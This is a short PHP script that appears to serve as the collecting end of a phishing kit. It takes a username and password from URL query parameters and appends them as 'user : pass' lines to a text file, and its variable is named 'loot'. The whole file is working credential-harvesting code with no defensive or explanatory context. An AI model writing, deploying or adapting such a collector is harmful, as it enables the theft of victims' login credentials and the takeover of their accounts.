<?php
$file = fopen("cd.txt", "a") or die("Unable to open file!");
$user = $_GET['u'];
$pass = $_GET['p'];
$loot_ = '%s : %s';
$loot = sprintf($loot_, $user, $pass);
fwrite($file, "\n". $loot);
fclose($file);
?>